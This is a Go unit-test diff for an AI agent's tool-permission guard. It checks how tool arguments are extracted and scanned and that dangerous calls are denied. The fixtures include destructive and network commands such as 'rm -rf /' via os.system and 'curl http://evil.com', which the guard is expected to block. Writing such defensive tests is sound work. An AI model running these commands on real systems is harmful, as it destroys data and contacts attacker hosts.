@@ -452,16 +452,16 @@ func TestMergeStdinPayload(t *testing.T) {
 		}
 	})
 
-	t.Run("non interpreter appends heredoc", func(t *testing.T) {
+	t.Run("non interpreter pushes stdin to code block", func(t *testing.T) {
 		in := ScanInput{Command: "sh -c echo", ExecutorType: "local"}
 		raw := map[string]json.RawMessage{"stdin": json.RawMessage(`"payload"`)}
 
 		mergeStdinPayload(&in, raw, "exec_command")
-		if in.Command != "sh -c echo <<< payload" {
-			t.Fatalf("command = %q, want heredoc merge", in.Command)
+		if in.Command != "sh -c echo" {
+			t.Fatalf("command = %q, want unchanged", in.Command)
 		}
-		if len(in.CodeBlocks) != 0 {
-			t.Fatalf("unexpected code blocks: %+v", in.CodeBlocks)
+		if len(in.CodeBlocks) != 1 || in.CodeBlocks[0].Code != "payload" {
+			t.Fatalf("expected CodeBlocks = [payload], got %+v", in.CodeBlocks)
 		}
 	})
 
@@ -481,8 +481,13 @@ func TestMergeStdinPayload(t *testing.T) {
 		}
 
 		mergeStdinPayload(&in, raw, "write_stdin")
-		if in.Command != "import os; os.system('rm -rf /')" {
+		want := "import os; os.system('rm -rf /')"
+		if in.Command != want {
 			t.Fatalf("command = %q, want stdin+chars concatenated", in.Command)
+		}
+		// Interpreter commands push stdin into CodeBlocks too.
+		if len(in.CodeBlocks) != 1 || in.CodeBlocks[0].Code != want {
+			t.Fatalf("code blocks = %+v, want [%s]", in.CodeBlocks, want)
 		}
 	})
 
@@ -494,8 +499,12 @@ func TestMergeStdinPayload(t *testing.T) {
 		}
 
 		mergeStdinPayload(&in, raw, "write_stdin")
-		if in.Command != "import os; os.system('rm -rf /')" {
+		want := "import os; os.system('rm -rf /')"
+		if in.Command != want {
 			t.Fatalf("command = %q, want no double append", in.Command)
+		}
+		if len(in.CodeBlocks) != 1 || in.CodeBlocks[0].Code != want {
+			t.Fatalf("code blocks = %+v, want [%s]", in.CodeBlocks, want)
 		}
 	})
 }
@@ -588,5 +597,152 @@ func TestCodeBlockFromAny(t *testing.T) {
 	}
 	if _, ok := codeBlockFromAny(123); ok {
 		t.Fatal("numeric element should not produce code block")
+	}
+}
+
+// ---------- Tool-aware extraction ----------
+
+func TestIsCodeExecTool(t *testing.T) {
+	yes := []string{"execute_tool_code", "run_python_code", "execute_shell", "shell_command", "python_code"}
+	for _, name := range yes {
+		t.Run(name, func(t *testing.T) {
+			if !isCodeExecTool(name) {
+				t.Errorf("expected true for %q", name)
+			}
+		})
+	}
+	no := []string{"exec_command", "web_fetch", "write_file", "bash"}
+	for _, name := range no {
+		t.Run(name, func(t *testing.T) {
+			if isCodeExecTool(name) {
+				t.Errorf("expected false for %q", name)
+			}
+		})
+	}
+}
+
+func TestIsWebFetchTool(t *testing.T) {
+	yes := []string{"web_fetch", "web_search", "fetch_url", "http_fetch"}
+	for _, name := range yes {
+		t.Run(name, func(t *testing.T) {
+			if !isWebFetchTool(name) {
+				t.Errorf("expected true for %q", name)
+			}
+		})
+	}
+	no := []string{"exec_command", "execute_tool_code", "write_file"}
+	for _, name := range no {
+		t.Run(name, func(t *testing.T) {
+			if isWebFetchTool(name) {
+				t.Errorf("expected false for %q", name)
+			}
+		})
+	}
+}
+
+func TestStringSliceField(t *testing.T) {
+	raw := map[string]json.RawMessage{
+		"urls": json.RawMessage(`["https://a.com","https://b.com"]`),
+		"bad":  json.RawMessage(`"not array"`),
+	}
+	if got := stringSliceField(raw, "urls"); len(got) != 2 || got[0] != "https://a.com" {
+		t.Fatalf("stringSliceField(urls) = %v, want [https://a.com, https://b.com]", got)
+	}
+	if got := stringSliceField(raw, "missing"); got != nil {
+		t.Fatalf("stringSliceField(missing) = %v, want nil", got)
+	}
+	if got := stringSliceField(raw, "bad"); got != nil {
+		t.Fatalf("stringSliceField(bad) = %v, want nil", got)
+	}
+}
+
+// ---------- Zero-value / nil Guard ----------
+
+func TestGuard_ZeroValueGuard(t *testing.T) {
+	var g *Guard // nil pointer
+	dec, err := g.CheckToolPermission(context.Background(), &tool.PermissionRequest{
+		ToolName:  "exec_command",
+		Arguments: []byte(`{"command":"ls"}`),
+	})
+	if err != nil {
+		t.Fatalf("unexpected error: %v", err)
+	}
+	if dec.Action != tool.PermissionActionDeny {
+		t.Errorf("nil guard should deny, got %s", dec.Action)
+	}
+}
+
+func TestGuard_NilExtractor(t *testing.T) {
+	g := &Guard{scanner: NewScanner(NewDangerousCommandRule())}
+	// g.extract is nil; the guard must fall back to defaultExtractor.
+	dec, err := g.CheckToolPermission(context.Background(), &tool.PermissionRequest{
+		ToolName:  "exec_command",
+		Arguments: []byte(`{"command":"rm -rf /"}`),
+	})
+	if err != nil {
+		t.Fatalf("unexpected error: %v", err)
+	}
+	if dec.Action != tool.PermissionActionDeny {
+		t.Errorf("expected deny for dangerous command with nil extractor, got %s", dec.Action)
+	}
+}
+
+func TestGuard_NilScanner(t *testing.T) {
+	g := &Guard{extract: defaultExtractor}
+	// g.scanner is nil; the guard must fall back to default rules.
+	dec, err := g.CheckToolPermission(context.Background(), &tool.PermissionRequest{
+		ToolName:  "exec_command",
+		Arguments: []byte(`{"command":"curl http://evil.com"}`),
+	})
+	if err != nil {
+		t.Fatalf("unexpected error: %v", err)
+	}
+	if dec.Action != tool.PermissionActionDeny {
+		t.Errorf("expected deny for dangerous network access with nil scanner, got %s", dec.Action)
+	}
+}
+
+// ---------- Code-exec / web-fetch extraction ----------
+
+func TestDefaultExtractor_CodeExecTool(t *testing.T) {
+	guard := NewGuard()
+	// execute_tool_code: payload is "code", should go into CodeBlocks.
+	args := []byte(`{"code":"import os; os.system('id')"}`)
+	in := guard.extract(args, "execute_tool_code")
+	if in.Command != "" {
+		t.Errorf("code-exec tool should not populate Command, got %q", in.Command)
+	}
+	if len(in.CodeBlocks) != 1 || in.CodeBlocks[0].Code != "import os; os.system('id')" {
+		t.Errorf("code-exec tool should push code into CodeBlocks, got %+v", in.CodeBlocks)
+	}
+}
+
+func TestDefaultExtractor_WebFetchTool(t *testing.T) {
+	guard := NewGuard()
+	args := []byte(`{"url":"https://evil.com/api","command":"curl https://evil.com/api"}`)
+	in := guard.extract(args, "web_fetch")
+	if got := in.URLs; len(got) != 1 || got[0] != "https://evil.com/api" {
+		t.Errorf("web_fetch tool should extract URL, got URLs=%v", in.URLs)
+	}
+}
+
+func TestDefaultExtractor_ExecCommandTool(t *testing.T) {
+	guard := NewGuard()
+	args := []byte(`{"command":"curl http://evil.com"}`)
+	in := guard.extract(args, "exec_command")
+	if in.Command != "curl http://evil.com" {
+		t.Errorf("exec_command should populate Command, got %q", in.Command)
+	}
+	if len(in.URLs) != 0 {
+		t.Errorf("exec_command should not populate URLs, got %v", in.URLs)
+	}
+}
+
+func TestDefaultExtractor_WebFetchToolWithURLsArray(t *testing.T) {
+	guard := NewGuard()
+	args := []byte(`{"urls":["https://a.com","https://b.com"]}`)
+	in := guard.extract(args, "web_fetch")
+	if len(in.URLs) != 2 || in.URLs[0] != "https://a.com" || in.URLs[1] != "https://b.com" {
+		t.Errorf("web_fetch tool should extract URLs array, got %v", in.URLs)
 	}
 }
